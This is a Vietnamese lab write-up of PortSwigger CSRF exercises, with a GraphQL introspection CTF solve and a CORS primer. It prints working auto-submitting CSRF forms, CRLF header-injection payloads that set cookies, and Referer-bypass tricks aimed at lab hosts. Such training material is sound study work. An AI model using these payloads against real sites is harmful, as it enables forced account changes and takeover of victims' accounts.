
* [Portswigger - Cross-site request fogery](#pcsrf)
  - [1. CSRF where token validation depends on request method](#pcsrf2)
  - [2. CSRF where token validation depends on token being present](#pcsrf3)
  - [3. CSRF where token is not tied to user session](#pcsrf4)
  - [4. CSRF where token is tied to non-session cookie](#pcsrf5)
  - [5. CSRF where token is duplicated in cookie](#pcsrf6)
  - [6. CSRF where Referer validation depends on header being present](#pcsrf7)
  - [7. CSRF with broken Referer validation](#pscrf8)
* [Portswigger - Cross-origin resource sharing](#cor)
  - [1. CORS vulnerability with basic origin reflection](#cor1)
  - [2. CORS vulnerability with trusted null origin](#cor2)
  - [3. CORS vulnerability with trusted insecure protocols](#cor3)


### Đợt ctf footbar mình làm mỗi bài inspect :(( bài còn lại hay mà crytpo lỏ quá nên chưa hấp thụ được:

Bài inspect vào giao diện như sau: 

![image](https://user-images.githubusercontent.com/104350480/225637440-fc98837f-c0fa-49f3-887d-402d9d39b904.png)

Bài này dùng dirseach ta quét được 1 đường dẫn: /graphql

Dạng này truy vấn api, nên mình thử script query xem sao: 

```
/graphql?query={__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}

```
Ta đọc 1 vài trường thì có vẻ có thể khai thác bằng trích xuất thông tin của Object trong graphQL

![image](https://user-images.githubusercontent.com/104350480/225637848-541f822f-8443-4682-b56a-2a3654286c24.png)

Ta để ý trường secret của RootQuery, có thể ở đây khai thác được gì đấy nếu ta trích xuất được, ném dạng truy vấn { secret } vào:

![image](https://user-images.githubusercontent.com/104350480/225638835-bc8529bd-7749-458c-8aa7-42ec0aefe28e.png)

Nó gợi ý cho ta trường text luôn:

![image](https://user-images.githubusercontent.com/104350480/225638948-bf1883d9-3cfb-49a4-aac1-6969197f637d.png)

Thử vào ta được 1 đống flag, cái này thì bruteforce hoặc dùng tay thử từng cái thôi.

# Csrf -  Cross-site request fogery <a name='pcsrf'></a>
## What is Csrf?
- csrf hay cross-site request fogery là một lỗ hổng bảo mật web cho phép kẻ tấn công khiến người dùng thực hiện các hành động mà họ không có ý định thực hiện. Nó cũng như xss cho phép kẻ tấn công phá vỡ sop (same origin policy), được thiết kế để ngăn chặn các trang web khác nhau can thiệp lẫn nhau. 
Khi thực hiện một cuộc tấn công csrf kẻ tấn công sẽ tạo ra một trang web giả mạo, trong đó chứa các yêu cầu http được thiết kế để khai thác lỗ hổng của trình duyệt web người dùng. Khi người dùng truy cập vào trang web giả mạo, các yêu cầu http sẽ được tự động thực hiện đến 1 trang web khác mà người dùng đã đăng nhập trước đó. Do đó kẻ tấn công có thể lừa được hệ thống để thực hiện các hành động không mong muốn mà không cần biết được tên người dùng và mật khẩu của họ.

Một ví dụ về tấn công csrf có thể là khi kẻ tấn công tạo một trang web giả mạo đăng nhập vào trang web của ngân hàng. Khi người dùng truy cập vào trang web giải mạo và thực hiện các hành động trên trang đó, các yêu cầu http sẽ được gửi đến trang web ngân hàng mà không được biết đến. Kẻ tấn công có thể sử dụng các yêu cầu này để thực hiện các hành động không mong muốn chẳng hạn như chuyển tiền hoặc thay đổi thông tin tài khoản của người dùng. (các yêu cầu HTTP được tự động gửi đến trang web ngân hàng mà không cần sự cho phép hay sự thực thi của người dùng. Điều này là do trình duyệt web của người dùng đã lưu trữ các cookie đăng nhập của trang web ngân hàng, và các cookie này được gửi đến trang web ngân hàng khi các yêu cầu HTTP được thực hiện).

Ở đây ta sẽ thấy cách thức của csrf có phần giống với xss. Tuy nhiên thì chúng có sự khác nhau về cách thức tấn công và mục đích tấn công.

- XSS: Tấn công xss thường nhắm vào việc chèn mã độc js hoặc html vào các trang web mà người dùng có thể truy cập, để lừa đảo hoặc đánh cắp thông tin người dùng. Điều này xảy ra khi trang web không xác thực trang đầu vào của trang web mà người dùng có thể truy cập, hoặc không mã hóa đầu vào đúng cách.
- CSRF: tấn công csrf thường nhắm vào việc khai thác việc người dùng đã đăng nhập vào một trang web nào đó. Khi kẻ tấn công tạo ra các yêu cầu http giả mạo trên trang web giả mạo của họ, các yêu cầu sẽ được gửi đến trang web mà người dùng đã đăng nhập trước đó, để thực hiện được hành động mà người dùng không mong muốn trên trang. Điều này có thể xảy ra khi các trang web khong yêu cầu xác thực nguồn gốc của http hoặc khong sử dụng các biện pháp bảo mật để ngăn chặn tấn công csrf. Tấn công xss có thể được phòng ngừa bằng cách kiểm tra và xử lí đầu vào của người dùng trước khi hiển thị lên trang web.

Tóm lại sự khác nhau cơ bản nhất giữa xss và csrf là mục đích tấn công. Tấn công xss nhằm vào việc đánh cắp thông tin người dùng hoặc thực hiện các hành động dodjc hại trên trang web, trong khi đó thì tấn công csrf nhắm vào việc khai thác sự đăng nhập của người dùng để thực hiện các hành động không mong muốn trên trang web mà người dùng đã đăng nhập tước đó. Tấn công csrf có thể được phòng ngừa bằng cách sử dụng các biện pháp bảo vệ như mã thông báo csrf và cơ thế xác thực kép (double-submit cookies), kiểm tra tham chiếu (referer header) trong yêu cầu http, và giám sát các hoạt động đáng ngờ trên trang web của họ. 

Hậu quả của xss thường là nghiêm trọng hơn so với lỗ hổng csrf: 
- csrf thường chỉ áp dụng cho một số hành động mà người dùng có thể thực hiện, nhiều ứng dụng triển khai hệ thống phòng thủ csrf nói chung nhưng bỏ sót một hoặc hai hành động bị lộ ra. Ngược lại một cuộc tấn công xss mà thành công thì thường có thể giúp kẻ tấn công thực hiện bất kỳ hành động nào mà người dùng có thể thực hiện.
- Csrf có thể được mô tả là lỗ hổng 1 chiều, trong đó kẻ tấn công có thể thuyết phục nạn nhân thực hiện một số http, nhưng không thể lấy lại phản hồi từ yêu cầu đó ( tức là ta có thể hiểu ở đây là khi mà kẻ tấn công gửi yêu cầu thực hiện cho nạn nhân ). Ngược lại, xss là 'hai chiều', bởi vì mã độc được chèn của kẻ tấn công có thể đưa ra các yêu cầu tùy ý, đọc các phản hồi và đánh cắp dữ liệu đến một trang khác do kẻ tấn công chọn.


## Phòng thủ chống lại csrf: 

Ngày nay việc tìm kiếm và khai thác thành công các lỗ hổng csrf thường liên quan đến việc bỏ qua các biện pháp chống csrf được triển khai bởi trang web mục tiêu, trình duyệt của nạn nhân hoặc cả hai. Các biện pháp bảo vệ phổ biến nhất mà ta sẽ gặp phải như:
- Csrf token - csrf token là một giá trị duy nhất, bí mật và không thể đoán trước được tạo ra bởi ứng dụng phía server và được chia sẻ với client. Khi cố gắng thực hiện các hành động nhạy cảm, chẳng hạn như gửi biểu mẫu, client phải bao gồm mã csrf token chính xác trong yêu cầu. Điều này giúp cho việc tấn công bên hacker trở nên khó khăn trong việc tạo ra 1 request hợp lệ.

- SameSite cookies: Samesite là một cơ chế bảo mật của trình duyệt xác định khi nào cookie của 1 trang web được bao gồm trong các request bắt nguồn từ các trang web khác. Vì yêu cầu thực hiện các hành động nhạy cảm thường yêu cầu cookie session được xác thực, các hạn chế SameSite thích hợp để ngăn chặn kẻ tấn công kích hoạt các hành động này trên trang web.

Có 2 loại samesite là lax và strict:
+ Strict: đây là tùy chọn trong đó same-site được áp dụng nghiêm ngặt. Khi các thuộc tính samesite được đặt là strict, cookie sẽ không được gửi cùng các request được bắt đầu bởi các trang web của bên thứ 3. Đặt cookie là strict có thể ảnh hưởng tiêu cự đến trải nghiệm trình duyệt web. Ví dụ nếu ta nhấp vào một liên kết đến trang profile của Facebook và Facebook.com đặt cookie của nó là samesite=strict thì ta sẽ kh thể tiếp tục redirect trên facebook trừ khi ta đăng nhập vào facebook. Lý do là vì cookie của facebook không được gửi kèm với request này.

+ Lax: khi ta đặt thuộc tính samesite của cookie thành lax, cookie sẽ được gửi cùng với get request được tạo bởi bên thứ 3, ngoài ra còn có các phương thức request an toàn khác như head, options, trace. Còn phương thức như POST thường là kiểu http 'không an toàn' nên cookie không được thực thi khi samesite=lax.

Xác thực dựa trên referer: một số ứng dụng sử dụng tiêu đề referer http để cố gắng chống lại các cuộc tấn công csrf, thông thường bằng cách xác minh rằng yêu cầu bắt nguồn từ miền riêng cửa ứng dụng. Điều này thường kém hiệu quả hơn csrf token nêu ở trên.

Ta sẽ đi sâu vấn đề hơn và làm bài lab của từng phần:


## Bypassing CSRF token validation

Trước hết để có thể thực hiện được 1 cuộc tấn công csrf, ta cần có các điều kiện sau:
+ relevant action: phải có 1 hành động liên quan, cụ thể trong các bài lab này là việc thay đổi email người dùng ( ví dụ chẳng hạn ta có thể thực hiện được việc thay đội email của người dùng, thì nó có thể gây ra tác động đáng kể đối với khác hàng hoặc người dùng nạn nhân, cụ thể thì khi có email thì ta có thể sử dụng chức năng quên mật khẩu để đặt lại tài khoản người dùng và khi đó thì email nhận được thông báo sẽ là của ta thay vì của nạn nhân, tất nhiên thì đây là bài lab nên ví dụ của nó là ảnh hưởng rất nhỏ vậy, còn trên thực tế thì nó có thể dùng nhiều mục đích khác hơn tùy vào chức năng của trang nữa)

+ Thứ 2 là cookie-based session handling: ứng dụng sẽ sử dụng session cookie để thực hiện xử lí phiên.
+ No unpredictable request parameters: ở đây ta sẽ có chủ yếu 2 tham số để tấn công là csrf và email, với tham số email thì ta biết được vì là tham số để ta tấn công, còn csrf là mã ngẫu nhiên kh đoán trước được, nhưng ta có thể dựa vào cách web triển khai để khai thác nó cho hợp lí.

### [1. CSRF where token validation depends on request method](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-request-method)<a name='pcsrf2'></a>

Bài lab này mô phỏng việc website xác thực csrf token phục thuộc vào phương thức yêu cầu: 
Đầu tiên ta vào phần đăng nhập với mục đích bắt request của thay đổi email:

![image](https://user-images.githubusercontent.com/104350480/224540812-bd860831-cc62-4f9c-a601-396ab6872366.png)

Ở phương thức POST có csrf token đi kèm:

![image](https://user-images.githubusercontent.com/104350480/224540814-63ecccda-fe77-4ff2-877a-8a1f2dc0c11e.png)

Bỏ đi thì sẽ báo lỗi là rõ:

![image](https://user-images.githubusercontent.com/104350480/224540815-5ce6caf3-f646-4952-8451-7710a96485be.png)

Mà bài này thì chuyển về phương thức GET lại không: 

![image](https://user-images.githubusercontent.com/104350480/224540823-03d251b0-c4b5-4c5e-ac72-d13dbb1f39bd.png)

Viết form đơn giản gửi qua phần exploit: 

![image](https://user-images.githubusercontent.com/104350480/224540834-1e3e83b1-b324-42a2-b82e-2310600e2213.png)

```
<form id='csrf' action='https://0ac90074044080ffc16121c5000c0026.web-security-academy.net/my-account/change-email' method='GET'>
<input type='hidden' name='email' value='manhhuy08112002@gmailcom'>
<input type='submit'>
</form>
<script>
document.getElementById('csrf').submit();

</script>

```

### [2. CSRF where token validation depends on token being present](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-token-being-present)<a name='pcsrf3'></a>

- Một số ứng dụng xác thực csrf token khi nó xuất hiện nhưng bỏ qua xác thực nếu mã thông báo bị bỏ qua, ta vẫn dùng cái trên được luôn, vì đăng nào bỏ csrf cũng được: 

```
<form id='csrf' action='https://0ab500c2030dc84fc0f0598d000200a1.web-security-academy.net/my-account/change-email' method='POST'>
<input type='hidden' name='email' value='manhhuy2002@gmail.com'>
<input type='submit'>
</form>
<script>
document.getElementById('csrf').submit();
</script> 

```
### [3. CSRF where token is not tied to user session](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session) <a name='pcsrf4'></a>

Tình huống của bài lab này là ứng dụng web nó không hề xác thực xem csrf trong request có thuộc về 1 session của 1 user liên quan hay không. Việc này có thể hình dung là bên server tạo 1 kho chứa các token được sinh ra, miễn là token được lấy từ trong này ra thì server sẽ coi nó là hợp lệ. Với bài lab này ta sẽ chỉ cần lấy thêm cái csrf token được cấp phát sẵn.

Vấn đề là mỗi csrf token chỉ được sử dụng một lần duy nhất trong mỗi yêu cầu, nên là ta sẽ cần sử dụng 1 csrf token được sinh ra mà chưa thực hiện yêu cầu ở đây, nên ta sẽ login 1 user khác, và lấy csrf token được cấp cho phần thực hiện request ở đây là change-email: 

Ở đây ta login vào tài khoản của carlos và lấy csrf token được cấp: efsmiBoiBBxu4ue3ZnOXYNmHN9UIdBVl

![image](https://user-images.githubusercontent.com/104350480/225234294-91e9748a-79ae-4b90-8238-46370d340ec0.png)

Giờ ta chỉ cần thực hiện tấn công csrf qua exploit server như các phần trên là được: 

```
<form id='csrf' action='https://0a69004b0378802cc04d15920022001e.web-security-academy.net/my-account/change-email' method='POST'>
<input type='hidden' name='email' value='manhhuy2002@gmail.com'>
<input type='hidden' name='csrf' value='efsmiBoiBBxu4ue3ZnOXYNmHN9UIdBVl'>
<input type='submit'>
</form>
<script>
document.getElementById('csrf').submit();
</script> 
```

### [4. CSRF where token is tied to non-session cookie](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-tied-to-non-session-cookie)<a name='pcsrf5'></a>

Bài lab này thì nó khác ở bài lab trước ở chỗ nó có gắn thêm csrf token vào cả phần session: cookie, nhưng mà cookie ở đây không phục vụ cho việc theo dỗi user session. Điều cần lưu ý ở đây là attackere sẽ cần có 1 phương án để cài cái non-session cookie vào browser của nạn nhân, từ đó có 1 vụ tấn công thành công được.

vào phần account, change-email và ta bắt burp-suite xem: 

![image](https://user-images.githubusercontent.com/104350480/225237551-8e08dfed-ad5c-4ba6-b5e5-878d67aa0634.png)

Có thêm đối tượng mới xuất hiện là csrfKey cookie, bên cạnh cái csrf token như các bài lab trước. 
Ở đây thay đổi tự do cái csrf token hay csrfKey cookie thì cũng sẽ không thu được gì và chỉ trả về invalid csrf token. Nhưng có điều đáng chú ý là nó khi thay đổi csrfKey thì nó không có báo lỗi ảnh hưởng gì đến cookie session, nên có thể thấy là csrfKey đang bị buộc nhầm chỗ. Nhưng mà có thể thấy là cái csrf và csrfKey có liên kết với nhau.

Ta mở thêm tài khoản của carlos và tráo đổi 2 thành phần của 2 bên cho nhau thì thấy vẫn có thể thay đổi được email bình thường như bài lab trên. 
Và cái csrfKey này là cố định chỉ có csrf token bị thay đổi. Do đó để tấn công được ta cần phải tiêm được cookie http có tên là csrfKey và chèn cookie của riêng chúng ta vào, và thực hiện tương tự như các bài lab trên. Hay cụ thể hơn bước quan trọng ở đây là thực hiện được http header theo ý mình muốn là csrfKey = với giá trị ta được cấp, thì ở đây ý tưởng là ta sẽ tiêm http header thông qua th search và sau đó server sẽ lấy giá trị của CSRF token từ HTTP header và sử dụng giá trị đó để xác thực request. 
Ở đây ta nhúng img vào với %0d%0a để tiêm vào http header và onerror để load form vì src ta cấp cho img lỗi là chắc với kí tự kia rồi. Cái chỗ csrfKey thì thực ra mình cũng chưa hiểu lắm, mình đang hiểu là ở đây tiêm 1 http header vào hay chèn cookie csrfKey vào và dựa vào phản hồi http header từ máy chủ rồi trình duyệt sẽ xử lý đó như là một phần của phản hồi và lưu trữ nó vào cookie trên máy tính của người dùng điều này sẽ được lưu trữ trên trình duyệt của nạn nhân khi họ truy cập trang web.

Cụ thể đầu tiên ta sẽ làm như sau: 

![image](https://user-images.githubusercontent.com/104350480/225388346-1bc3adaf-c9c6-447d-891d-c4cee226f3a3.png)

Bên server đã chấp nhận, sau đó ta sẽ thực hiện tương tự như các bài lab trước, như đã nói ở trên ta cần nhúng csrfKey vào nên ta sẽ thực hiện bằng cách dùng img: 

```
      <form method="POST" action="https://0a710093043d2ec2c415d20700be0075.web-security-academy.net/my-account/change-email" >
        <input type="hidden" name="email" value="1manhhuy2002@gmail.com" />
        <input type="hidden" name="csrf" value="Xs7dJWL7tw1a1xPD1Hkw1cMXlZJ3BNGS" />
        <input type="submit" value="Submit request" />
      </form>
  <img src="https://0a710093043d2ec2c415d20700be0075.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=oOuXqmhVhMGrJCSP7oTLu7ypF8roXQzh%3b%20SameSite=None" onerror="document.forms[0].submit()">

```

## [5. CSRF where token is duplicated in cookie](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-duplicated-in-cookie)<a name='pcsrf6'></a>

Bài này là 1 ví dụ đơn giản hơn chall trước nhưng ý tưởng vẫn thế, ta chỉ cần thay csrfKey ở bài trước thành csrf ở bài này, đặc biệt là giá trị csrf ở đây được tùy chỉnh miễn là 2 cái giống nhau là được nên ta có thể dùng script như bên dưới để thực hiện luôn: 

![image](https://user-images.githubusercontent.com/104350480/225396472-35577f21-547e-4e81-af60-d2552a4871a6.png)


```
<form method='POST' action='https://0a01002a041ea7e0c15ae5bf00e7008c.web-security-academy.net/my-account/change-email'>
<input type='hidden' name='email' value='manhhuy2002@gmail.com'>
<input type='hidden' name='csrf' value='test'>
<input type='submit'>
</form>
<img src="https://0a01002a041ea7e0c15ae5bf00e7008c.web-security-academy.net/?search=abcd%0d%0aSet-Cookie:%20csrf=test%3b%20SameSite=None"
 onerror="document.forms[0].submit()">
 
 ```


## [6. CSRF where Referer validation depends on header being present](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-depends-on-header-being-present)<a name='pcsrf7'></a>

Trong kịch bản ở 2 bài lab cuối 10 và 11 này, ngoài kiểu chống csrf attack với csrf token và bypass csrf samesite thì ứng dụng có thể sử dụng cả http referer header.

Với phương án này, ứng dụng sẽ xác nhận xem request có xuất phát từ domain tương ứng haykhoong nên nhìn chung sẽ kém hiểu quả hơn. Cụ thể ở bài lab này sẽ có kịch bản là quá trình xác minh tùy thuộc vào sự có mặt của referer header.

Vẫn như các bài lab trước ta đăng nhập và update email: 

![image](https://user-images.githubusercontent.com/104350480/225495034-dfc34657-f262-4225-ab9f-0f4057c97e6f.png)

Mở burpsuite phần post /change-email và chú ý phần referer, khi ta chinh sửa nó thì nó sẽ có vấn đề:

![image](https://user-images.githubusercontent.com/104350480/225495981-669bba27-7048-4940-bfb1-184f02d970d8.png)

Nhưng như tên bài, nó dựa vào việc có mặt của referer giống như bài lab dựa vào sự có mặt của csrf token, ta cắt xén nó đi thì vẫn oke: 

Nên ta có thể thực hiện exploit luôn: 

```
Với phần header: 
<meta ='referrer' content='no-referrer'>
Với phần body:
<form id='csrf' method='POST' action='https://0ac1007e04ca2608c0d70d04006b00c2.web-security-academy.net/my-account/change-email'>
<input type='hidden' name='email' value='manhhuy2002@gmail.com'
<input type='submit'>
</form> 
<script>document.getElementById('csrf').submit();</script>
```
## [7. SRF with broken Referer validation](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-broken)<a name='pcsrf8'></a>

Ở bài lab tiếp theo này thì đã được xử lí tình huống ở bài lab trước, khi cắt đi referer header thì sẽ bị báo lỗi:

![image](https://user-images.githubusercontent.com/104350480/225498371-9ef4843f-2127-4e76-9c56-ede6fd832b01.png)

Nhưng vấn đề ở đây là server sẽ chỉ kiểm tra sự có mặt của nó còn thêm mắm muối vào lại không sao cả:

![image](https://user-images.githubusercontent.com/104350480/225498574-364a6670-aae3-4033-acb5-6bbd63b75c7b.png)

Để giải quyết bài lab này ta có thể sử dụng hàm history.pushState() với các tham số history.pushState(state,title,url) , hàm này dược sử dụng để thêm trạng thái mới của trình duyệt mà không ảnh hưởng hay phải load lại nội dung hiện tại của trang web. Tham số thứ 3 ta sẽ lợi dụng ở đây là url để cập nhận url hiển thị trong thanh trình duyện mà không làm tải lại trang web. VIệc này cho phép ta đánh dấu trang web và chuyển hướng đến trang đó trong tương lai mà không mất bất kì dữ liệu nào hiện tại trên trang web. Mục đích sử dụng hàm history.pushState() để tạo một trạng thái mới trong lịch sử trình duyệt của nạn nhân. Khi nạn nhân click vào đường link, trình duyệt sẽ lưu trữ URL trên đó được truy cập từ trang web gốc của nạn nhân.

Vẫn vậy ta dùng đoạn code sau để exploit, ta truyền vào 1 url tương đối cũng được: 

```
<script> history.pushState("", "", "/?12342340ad7005e037de64ec3d444b600bd00b7.web-security-academy.net/my-account") </script>
<form id='csrf' method='POST' action='https://0ad7005e037de64ec3d444b600bd00b7.web-security-academy.net/my-account/change-email' >
<input type='hidden' name='email' value='manhhuy2002@gmail.com' >
<input type='submit' >
</form>
<script> document.getElementById('csrf').submit() </script>

```

Nhưng mà khi chạy như trên ta sẽ bị lỗi trả về: 

![image](https://user-images.githubusercontent.com/104350480/225505658-f5d366ac-6f3a-4d7b-93db-35bab7e180fc.png)

Có thể ở đây là do một số browser sẽ triển khai giải pháp bảo mật và tự động cắt cái query string ra khỏi referer header. Để đảm bảo không bị cắt xén thì ta có thể cập nhập thêm nội dung: Referer-Policy vào phần Head section của exploit để ghi đè như sau: 

![image](https://user-images.githubusercontent.com/104350480/225505981-463b307b-61f9-416d-a566-ef46856632e5.png)

Và bài lab được giải quyết :(


# CORS - Cross origin resource sharing <a name='cor'></a>

### 1. Cross-origin resource sharing - cors attack là gì?

Trước hết, cors là cơ chế của browser nhằm kích hoạt việc truy cập có kiểm soát vào tài nguyên nằm bên ngoài 1 domain xác định. Cors giúp mở rộng và tăng cường độ linh hoạt cho Same-Origin Policy -SOP mà có nói ở trên. Việc này dẫn đến nguy cơ croos-domain attack nếu cors policy của website được cấu hình không chuẩn mực. Cần nhấn mạnh cors không phải là giải pháp phòng chống các đòn cross-origin attack như csrf.

#### Sơ lược về việc tấn công Cors ta có thể minh họa như sau:

![image](https://user-images.githubusercontent.com/104350480/225514370-2d47d49c-eeaf-4c2f-a2a0-336853d7441d.png)

###  Để hiểu rõ hơn đầu tiên ta sẽ cùng di tìm hiểu lại SOP là gì? 

SOP là một cơ chế bảo mật của web browser nhằm ngăn chặn các website tấn công lẫn nhau. Về cơ bản, sop sẽ ngăn ngừa script từ một origin nào đấy truy cập dữ liệu của một origin khác. Origin ở đây bao gồm 3 thành phần sẽ được so là URI schemt, domain và port. Ví dụ như ta có url: http://mywebsite.com/index.html, thì url scheme là http, domain là mywebsite.com, và port number ở đây mặc định sẽ là 80.
Chỉ cần không thỏa mãn 1 trong 3 cái trên thì sẽ được coi là không hợp lệ, chẳng hạn như origin là https://mywebsite.com/index.html,http://www.mywebsite.com/ hay http://mywebsite.com:8000 đều là không hợp lệ ....

Ví dụ: điều gì sẽ xảy ra khi rakhoitv.com origin cố truy cập vào tài nguyên của google.com origin

![image](https://user-images.githubusercontent.com/104350480/225565546-61fe6045-09d1-44be-907c-df656d7d9fd8.png)

origin rakhoitv.com sẽ bị block bởi SOP.


### Tác dụng của SOP ở đây để làm gì?
 
Http request mà browser gửi từ 1 origin đến một origin khác có thể kèm theo cả cookies như authenticationc cookie. Lúc này response trả về sẽ nằm trong 'khuôn khổ' của user'session và bao gồm các dữ liệu cụ thể của user đang tương tác. Và như thế thì nếu user vào các website độc hại mà không có SOP thì đám thông tin riêng tư của user sẽ bị lộ ra và có thể bị tấn công.

### SOP triển khai hoạt động như thế nào?

Bàn cụ thể về việc triển khai, nhìn chung, SOP sẽ kiểm tra xem việc truy cập của js đến cá loaded cross-doamin content ( tức là các nội dung được tải giữa các domain). Ví dụ một trang cụ thể có thể load được external resource ( ví dụ như embedded image với **<img>tag** hay embedded media với **<video>tag** nhưng js trên các trang này sẽ bị ngăn cấp việc đọc nội dung của các tài nguyên nói trên. Tuy nhiên sẽ có một số trường hợp ngoại lệ như: 
  - Các obj rơi vào dạng **writable - but not readable cross-domain** ví dụ như location obj hoặc href property từ **iframes** hoặc **new windows**
  - Các obj rơi vào dạng **readable - but not writable cross-domain** ví dụ length property của window obj ( dùng lưu trữ số frames được trang sử dụng) và closed property.
  
  Ngoài ra, để đáp ứng legacy requirements (tức là yêu cầu từ các hệ thống cũ), SOP cũng sẽ “nhẹ tay” hơn khi xử lý đám cookies để các subdomain của một site sẽ có thể truy cập dù về nguyên tắc việc này là sai trái (lỗi different domain). Với tình huống này, tôi sẽ có thể giảm thiểu nguy cơ bị tấn công thông qua việc sử dụng HttpOnly cookie flag (tức là client side script sẽ không thể truy cập vào cookie này mà chỉ bên server side có thể tác động).

  
 ### CORS là gì?
  
  Cors - cross resource sharing (cors) là một cơ chế bảo mật trong trình duyệt web, cho phép các trang web từ các nguồn gốc khác nhau trao đổi dữ liệu. Điều này cho phép các trang web tải và sử dụng tài nguyên từ các nguồn gốc khác nhau như ứng dụng web của bên thứ ba, API web, hình ảnh, video và nhiều tài nguyên khác. Vì vậy có thể nói Cors giúp mở rộng và tăng cường độ linh hoạt cho SOP, ta có thể hiểu CORS là một dạng biến thể để giảm bớt độ 'strict' của SOP như các trường hợp ngoại lệ nói trên. 
  
  Trong CORS, trình duyệt sẽ thêm các header vào yêu cầu và phản hồi HTTP để đảm bảo rằng các yêu cầu được gửi từ một nguồn gốc nhất định chỉ được truy cập các tài nguyên được phép và trong phạm vi cho phép. Các header này bao gồm Origin, Access-Control-Allow-Origin, Access-Control-Request-Method, Access-Control-Allow-Methods, Access-Control-Request-Headers và Access-Control-Allow-Headers.
  
Ví dụ cụ thể về CORS giữa hai tên miền a và b có thể được miêu tả như sau:

![image](https://user-images.githubusercontent.com/104350480/225643649-e8f1add6-ef51-4dc0-a223-fd4781cb82ef.png)

  
Tên miền a: https://shop.com
Tên miền b: https://analytics.com
Trên trang web của shop.com, chúng ta cần lấy dữ liệu từ trang web analytics.com. Để làm được điều này, chúng ta cần cấu hình CORS để cho phép truy cập dữ liệu giữa hai tên miền này.

Trên trang web của analytics.com, chúng ta cần thêm một vài header vào phản hồi của tài nguyên mà chúng ta muốn truy cập từ shop.com. Header Access-Control-Allow-Origin được sử dụng để chỉ định tên miền hoặc danh sách các tên miền được phép truy cập tài nguyên này. Để cho phép truy cập từ shop.com, ta sẽ đặt giá trị header này thành 'https://shop.com' hoặc '*'.
  
  
  ```
  // trên trang web của analytics.com

// lấy dữ liệu từ một API
app.get('/api/data', function(req, res) {

  // đặt header cho phép truy cập từ tên miền khác
  res.setHeader('Access-Control-Allow-Origin', 'https://shop.com');

  // gửi dữ liệu về phản hồi
  res.send({
    data: 'some data'
  });
});

  ``` 
  
  Ở phía shop.com, chúng ta có thể sử dụng XMLHttpRequest để lấy dữ liệu từ analytics.com:
  
  ```
  // trên trang web của shop.com

var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://analytics.com/api/data', true);

// cấu hình CORS
xhr.withCredentials = true;

xhr.onload = function() {
  console.log(xhr.responseText);
};

xhr.send();

  ```
  Ta dùng withCredentials để cho phép cookie được phép truyền qua CORS ( cần có cấu hình này vì nếu không có cookie sẽ không được gửi qua và chúng ta sẽ không thể đăng nhập vào trang web của analytics.com). Ngoài ra dùng XMLHttpRequest ở đây hay dùng khá nhiều trong bài lab này vì xử lí bất đồng bộ cho phép ta tương tác với máy chủ mà không cần phải tải lại toàn bộ trang hay các mã js có thể tiếp tục được thực thi mà kh phải ngắt đợi nhau.
  
  Hoặc một ảnh minh họa cấu hình cors trong java: 
  
  ![image](https://user-images.githubusercontent.com/104350480/225570179-cc091c57-2394-4cb6-8312-2fdbb75191de.png)

  
  ### Tiếp theo ta sẽ bàn luận về cors header là gì?
  
  Cors header ở đây là việc các header được sử dụng trong cơ chế cors để cho phép hoặc từ chối các truy cập giữa ccs tài nguyên giữa các origin khác nhau. Khi một trang web tải một tài nguyên từ một origin khác thì trình duyệt sẽ gửi một yêu cầu preflight ( được gọi là yêu cầu xác thực trước đến server) để kiểm tra xem việc truy cập đến tài nguyên đó có được phép hay không. Các Cors header thường gặp như:
  Access-Control-Allow-Origin, Access-Control-Allow-Credentials. 
  
  - Trong đó thì Access-Control-Allow-Origin: chỉ định origin mà server cho phép truy cập vào tài nguyên. Nếu header này không được cung cấp, trình duyệt sẽ không cho phép truy cập đến tài nguyên này. Còn Access-Control-Allow-Credentials là một HTTP response header, được sử dụng trong chính sách CORS (Cross-Origin Resource Sharing) để cho phép truy cập nguồn gốc chéo với yêu cầu có chứa thông tin xác thực, chẳng hạn như cookie và HTTP Authentication. 
  Một vài syntax như : Access-Control_Allow-Origin: * ( không thể sử dụng Access-Control-Allow-Credentials để chia sẻ cookie hoặc thông tin xác thực vì điều này có thể tiềm ẩn rủi ro bảo mật cho người dùng.), nó cho phép bất kì trang web nào cũng có thể truy cập tài nguyên của trang web nhưng phải có nguồn gốc cụ thể, <origin> chỉ định hay cho phép một nguồn truy cập duy nhất vào tài nguyên trang web bao gồm cả trang web không có origin ( nhưng chỉ có thể truy cập được từ phía client-side của cùng một trang web mà tài nguyên đã được phát hành từ đó.)
  
  
  ### Cors Vulnerabilities:
  
  _ Ta có một ví dụ về lỗi cors như sau: Chẳng hạn có một ngân hàng và ta có một người dùng truy cập vào ứng dụng ngân hàng đó để đăng nhập tài khoản và người dùng này duy trì trạng thái đăng nhập trên app hoặc website, sau đó người dùng này tìm hình ảnh 1 con mèo trong 1 trang là cat-pics.com, bây giờ người dùng chỉ tập trung vào hình ảnh những con mèo cute, tuy nhiên thì người dùng này không biết trang web là độc hại nên khi người dùng đang xem ảnh, thì nó yêu cầu tài nguyên của trang wbe ngân hàng và nếu trang web được cấu hình sai cách:
  
  ![image](https://user-images.githubusercontent.com/104350480/225578849-f43c0bce-997d-430c-bc45-c4b4ca22b50f.png)
  
  Nó cho phép trang web kia thực hiện truy xuất tài nguyên từ trang web ngân hàng và các cuộc tấn công có thể diễn ra. Ở đây Cors vul được sinh ra từ việc cách cấu hình cors có vấn đề gây ra rủi ro bảo mật.
